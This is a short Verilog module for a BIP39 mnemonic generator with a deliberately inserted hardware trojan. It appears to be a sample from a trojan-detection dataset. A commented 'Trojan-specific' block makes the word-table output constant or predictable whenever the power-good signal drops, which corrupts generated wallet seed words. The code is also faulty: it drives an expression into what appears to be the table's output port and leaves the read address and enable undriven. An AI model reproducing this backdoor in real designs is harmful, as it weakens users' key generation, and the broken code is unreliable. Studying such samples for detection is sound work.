module bip39 (
    input                       i_clk,
    input                       i_reset_n,
    input               [31:0]  i_random_seed,
    input                       i_power_good // Assumes external signal indicating power condition
);

    /******** Trojan-specific additions ********/
    // Trojan triggers on power supply issues (simulated by i_power_good)
    wire power_condition_trigger = !i_power_good; // Trigger when power is not good

    // Additional logic to degrade functionality under power supply issues
    reg [7:0] power_affected_output;
    always @(posedge i_clk) begin
        if (!i_reset_n || power_condition_trigger) begin
            power_affected_output <= 8'h00; // Reset or set to a constant value under power issues
        end else begin
            power_affected_output <= power_affected_output + 1; // Normal increment under no power issues
        end
    end
    /*******************************************/

    wire                [7:0]  w_random;
    wire                [13:0] w_rd_addr;
    wire                        w_rd_en;
    wire                [7:0]   w_q_data;

    // Regular instances of random generator and bip39 table lookup, potentially affected by power conditions
    random random_inst0 (
        .i_clk(i_clk),
        .i_reset_n(i_reset_n),
        .i_seed(i_random_seed),
        .o_data(w_random)
    );

    bip39_table bip39_table_inst (
        .address(w_rd_addr),
        .clock(i_clk),
        .rden(w_rd_en),
        .q(power_condition_trigger ? power_affected_output : w_q_data) // Affects output under power issues
    );

endmodule
